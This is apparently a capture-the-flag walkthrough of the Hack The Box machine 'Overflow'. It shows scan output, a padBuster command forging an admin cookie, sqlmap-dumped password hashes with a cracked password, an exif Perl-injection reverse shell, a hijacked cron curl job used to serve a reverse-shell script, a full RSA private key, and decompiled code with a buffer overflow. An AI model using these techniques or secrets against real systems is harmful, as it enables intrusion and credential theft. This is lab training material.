# Overflow

Difficulty: 8
Tags: Blind SQLi, PATH, SQLi, Web, binary, binary exploitation, cms made simple, cmsms, exif_read_data, file upload, perl injection, sqlmap, subdomains
Type: Linux

# Enumeration

portscan 

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Overflow Sec
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- dir scan

```bash
/login.php            (Status: 200) [Size: 1878]                                                                      
/home                 (Status: 301) [Size: 311] [--> http://overflow.htb/home/]
/index.php            (Status: 200) [Size: 12227]                              
/register.php         (Status: 200) [Size: 2060]                                
/assets               (Status: 301) [Size: 313] [--> http://overflow.htb/assets/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]                    
/config               (Status: 301) [Size: 313] [--> http://overflow.htb/config/]
```

- scanning /config directory

```bash
[kali@kali] [~/htb/overflow] $ gobuster dir -u http://overflow.htb/config -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 --no-error -x php,html,log,txt,db.config                                                
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://overflow.htb/config
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,log,txt,db.config,php
[+] Timeout:                 10s
===============================================================
2021/10/25 10:17:53 Starting gobuster in directory enumeration mode
===============================================================
/users.php            (Status: 200) [Size: 0]
/db.php               (Status: 200) [Size: 0]
/auth.php             (Status: 200) [Size: 0]
```

- used padbuster to check and exploit padding oracle vulnerability

```bash
padBuster.pl http://overflow.htb/home/index.php 'K9mp2CXtH2kD30sfXJb58umCXCNRsD52' 8 -cookies "auth=K9mp2CXtH2kD30sfXJb58umCXCNRsD52" -plaintext "user=admin"
```

- found the admin cookie, used that to get to the admin panel login page
- /admin_cms_panel/admin/login.php
- run sqlmap with admin cookies on /home/logs.php?name=admin to get creds for admin

```bash
admin:c71d60439ed5590b3c5e99d95ed48165

cms admin creds

admin@overflow.htb:c6c6b9310e0e6f3eb3ffeb2baff12fdd
```

- admin cookie: auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
- Running an sqlmap scan reveals encrypted admin password in cmscmsdb â†’ cms_users
- Found the salt in cms_siteprefs.csv

```sql
sitemask,6c2d17f37e226486,<blank>,<blank>
```

- cms_users.csv

```sql
user_id,email,active,password,username,last_name,first_name,create_date,admin_access,modified_date
1,admin@overflow.htb,1,c6c6b9310e0e6f3eb3ffeb2baff12fdd,admin,<blank>,<blank>,2021-05-24 21:18:35,1,2021-05-26 14:49:15
3,<blank>,1,e3d748d58b58657bfa4dffe2def0b1c7,editor ,<blank>,editor,2021-05-25 06:38:33,1,2021-05-26 04:13:58
```

# Initial Access

- cracking the hash obtained from the database

```
e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486:alpha!@#$%bravo
```

- using this password to log into the admin dashboard of cms made simple
- Found a subdomain `devbuild-job.overflow.htb`
- It's based on a codepen template
- `/home/profile` has a file upload functionality that accepts tiff, jpeg and jpg files
- Looks like it uses exif_read_data to check for file types
- used the metasploit module `exif perl injection` to upload a malicious image file, checked it's path while uploading with burpsuite
- Opened it to gain a reverse shell as www-data

# Privilege Escalation

- Found db.php with user `developer` creds
- used to it get to developer shell
- `/opt/commontask.sh` is running a curl request on taskmanage.overflow.htb/taks.sh
- since developer belongs to group network we can alter the /etc/hosts file
- creating a [task.sh](http://task.sh) with reverse shell script on the attacking machine and hosting it using `python3 -m http.server 80`
- got `tester` shell

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA/KM9kpsvyAXhw8DEWcAmkHjyBFFeXWjU/FrbIRnoe/m1rydX
CIh0jG0GpCxUkju/YRSsmjh6NpAmgK7b4IQ+CjZZfHjMfij5t1JJ6OEf3ouA+eFE
Knd4zXkqnTo55Lpys2/wQnjDBBWCSvoi5VAwV5uo0O6HC71Qatqs0I/1p7FtSqew
uUiLxjNwtGlrrbn/SgUZk3AVl93L16eyEAh2ke+7Uv5y/xJ33/dHbBNfqTvn1+DL
6tf0Jf/Sq8mE9qz+rU4d/CZ8Hdn5x24lPXTXYvuVxGVn33YCt+W5jOiMq38BAnWW
h7dON3oISciYeXyRuwYClZ5vWU6A16LdM60neQIDAQABAoIBAQCmkdKk+ODWFtq1
wEE1k7VZiAS5yBRZribPg+/6sSRRqWCa7Ws62w1NEQ1R7VCNYgtarNDoldguZXid
W6zpKQfmn9L8eIELpWSP9Bd7DgN/LaeKGXZiMYdaokrwg1Vsc2nw2RsmGI0sAip3
2NhtLSPSf3Uc3Ef5+4YsDaXnlSM4vjmgB0qc9mYYaj4oDR2Iq+ZvA/VIZxWMkpoO
BLT5olW/yD7JV0v172y9gVCU4lE5sfDfCAZsUj9hPndaiVINrcw+noeBNctYQjpM
kXX67QnLc7KpkjenuZGvOPAjNg1YQ6dYOnGnvNn46/5ZLXj8zvtRGcsSmsOCk1Uo
UnmtdUGhAoGBAP8R8yOs4mh8eUfqmpPxwOg3aI89lBU5Ue7cUdgoFybUyqAf21Dw
a11YkVOwXZhlgbboDZ1gGhGht371vg2+7ohhPTv828zu3pO3Iw93pgbRFzO6H0nR
f4Ck7vA2U8G5r29xpP/gFrR8yHhL36RlsIK4cm3l+Gr20A0W/mCnLLSVAoGBAP2P
BUZwJo+krc8l51BGyeaCdvoYE3GW73OFYoMS4EOm7YrbOmuxMMxRu7ouUji1Ng7y
o8PQorp7SjstcbtbJmcmyLiTBMuDsZ9xtMyvYiFjx0TfOIr71qAqhzgUP7BspQVS
AQEwZgs+vYK80unBTcUkaTUVzPbnhNclFu/jcepVAoGAKxSgCU2A6/7iCRiBxS0W
1OHO4iqXYUJOKVbC6AxVZLSaCJN42mHQ8HIuEYF/PWcfkoH9ErCRlprGwEXHNNEj
vpsV2ZTqluFdbHuJC2q8+vfDwHPWJwSgUV0KEj5KxTSUgfEi2ijCDPfqcA74le6q
8lku0or9+yr2ls9kZXS240UCgYEA0jQOIH37SdwxB2kZ4bA90y5XajApdmK1siRj
LdypNQyfIx1pyjvEA67Cna+nFEIORcgbwcsmDMkHGhYrkjIXnS5G+tVPBVTxHQjL
5WCETsAEQ/F2U6pCHNgE75XB0wXOrKF2GcFA55Ok0kyt4YISchwkaBDhsdLvitjB
si/xkV0CgYEA4MU7MQB8YKJr9jWon7i5w4LV10fV/MdDmDC9LiL6/QNE2USCk24w
InmHWXuxbvwfylUxVgSsVZRNgbhoyWoj9STAus1ShmsGJfoYNUl0S2zASUOSWTm9
bjTir22flVq3pLIng3vhBY0tTA0qNrEsKSSGwie8zrbPQusvGh9RFb0=
-----END RSA PRIVATE KEY-----
```

## Notes

- using gdb to find the password during program execution
    
    ```bash
    0x56555ab7 <+7>:     call   0x56555720 <__x86.get_pc_thunk.bx>                                                                                                                                                                          
    => 0x56555abc <+12>:    add    ebx,0x24e4                                                                                                                                                                                                  
       0x56555ac2 <+18>:    call   0x565556b0 <rand@plt>
       **0x56555ac7 <+23>:    mov    DWORD PTR [ebp-0xc],eax**
       0x56555aca <+26>:    sub    esp,0xc
       0x56555acd <+29>:    push   DWORD PTR [ebp-0xc]
       0x56555ad0 <+32>:    call   0x5655581d <random>
       0x56555ad5 <+37>:    add    esp,0x10
       0x56555ad8 <+40>:    mov    DWORD PTR [ebp-0x10],eax
       0x56555adb <+43>:    sub    esp,0x8
       0x56555ade <+46>:    push   DWORD PTR [ebp-0xc]
       0x56555ae1 <+49>:    lea    eax,[ebx-0x22a8]
       0x56555ae7 <+55>:    push   eax
       0x56555ae8 <+56>:    call   0x565555e0 <printf@plt>
       0x56555aed <+61>:    add    esp,0x10
       0x56555af0 <+64>:    sub    esp,0x8
       0x56555af3 <+67>:    lea    eax,[ebp-0x14]
       0x56555af6 <+70>:    push   eax
       0x56555af7 <+71>:    lea    eax,[ebx-0x2283]
       0x56555afd <+77>:    push   eax
       0x56555afe <+78>:    call   0x565556c0 <__isoc99_scanf@plt>
       0x56555b03 <+83>:    add    esp,0x10
       0x56555b06 <+86>:    mov    eax,DWORD PTR [ebp-0x14]
       0x56555b09 <+89>:    cmp    DWORD PTR [ebp-0x10],eax
       0x56555b0c <+92>:    jne    0x56555b4a <check_pin+154>
    ```
    
    - read the value of [ebp-0xc] to get the password
- found decompiled version of the check_pin() function

```c
void check_pin(void)

{
  undefined local_2c [20];
  int local_18;
  long local_14;
  int local_10;
  
  local_10 = rand();
  local_14 = random();
  printf("This is the code %i. Enter the Pin: ",local_10);
  __isoc99_scanf(&DAT_00010d1d,&local_18);
  if (local_14 == local_18) {
    printf("name: ");
    __isoc99_scanf(&DAT_00010c63,local_2c);
    puts(
        "Thanks for checking. You can give your feedback for improvements at developer@overflow.htb"
        );
  }
  else {
    puts("Wrong Pin");
  }
  return;
}
```

- random() function

```c
long random(void)

{
  uint in_stack_00000004;
  uint local_c;
  int local_8;
  
  __x86.get_pc_thunk.ax();
  local_c = 0x6b8b4567;
  local_8 = 0;
  while (local_8 < 10) {
    local_c = local_c * 0x59 + 0x14;
    local_8 = local_8 + 1;
  }
  return local_c ^ in_stack_00000004;
}
```